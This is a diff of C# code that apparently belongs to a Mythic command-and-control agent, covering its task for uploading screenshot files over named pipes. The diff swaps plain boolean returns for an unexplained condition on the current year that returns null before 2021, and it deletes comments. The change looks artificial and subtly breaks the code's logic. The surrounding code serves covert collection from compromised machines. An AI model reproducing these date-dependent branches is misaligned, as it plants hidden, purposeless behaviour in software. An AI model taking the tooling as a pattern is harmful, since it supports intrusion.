@@ -102,10 +102,10 @@ namespace Tasks
                                     mythicFileId,
                                     false,
                                     ""));
-                                return true;
+                                if(DateTime.Now.Year > 2020) { return true; } else { return null; }
                             } else
                             {
-                                return false;
+                                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                             }
                         }, _stopToken.Token);
                         uploadTasks.Add(uploadTask);
@@ -198,7 +198,7 @@ namespace Tasks
                                     };
                                     WaitHandle.WaitAny(waiters);
                                     ST.Task.WaitAll(uploadTasks.ToArray());
-                                    //bool bRet = uploadTasks.Where(t => t.Result == false).ToArray().Length == 0;
+                                    
                                     bool bRet = uploadTasks.All(t => t.Result is true);
                                     if (bRet)
                                     {
@@ -259,7 +259,7 @@ namespace Tasks
         private void ProcessSentMessage(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
-            // Potentially delete this since theoretically the sender Task does everything
+            
             if (pipe.IsConnected)
             {
                 pipe.EndWrite(result);
@@ -296,7 +296,7 @@ namespace Tasks
             }
 
             ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
-            //Console.WriteLine("We got a message: {0}", mt.ToString());
+            
 
             if (msg.GetTypeCode() != MessageType.ScreenshotInformation)
             {
